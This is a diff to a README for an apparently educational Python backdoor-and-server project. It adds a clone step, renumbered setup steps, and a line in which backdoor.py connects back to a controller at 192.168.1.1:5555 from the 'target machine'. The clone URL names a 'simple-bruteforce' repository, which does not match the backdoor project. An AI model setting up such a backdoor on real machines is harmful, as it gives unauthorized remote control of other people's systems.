@@ -24,13 +24,19 @@ This project is a Python implementation of a simple backdoor and server communic
 
 1. Ensure you have Python 3.x installed on both server and target machines.
 
-2. Update the IP address in both backdoor.py and server.py to match the server's IP:
+2. Clone or download this repository:
+        ```bash
+        git clone https://github.com/fadlyfatih1/simple-bruteforce.git
+        cd simple-bruteforce
+        ```
+
+3. Update the IP address in both backdoor.py and server.py to match the server's IP:
    ```bash
     s.connect(('192.168.1.1', 5555))  # In backdoor.py
     sock.bind(('192.168.1.1', 5555))  # In server.py
    ```
    
-3. Running the server:
+4. Running the server:
 ```bash
 python3 server.py
 ```
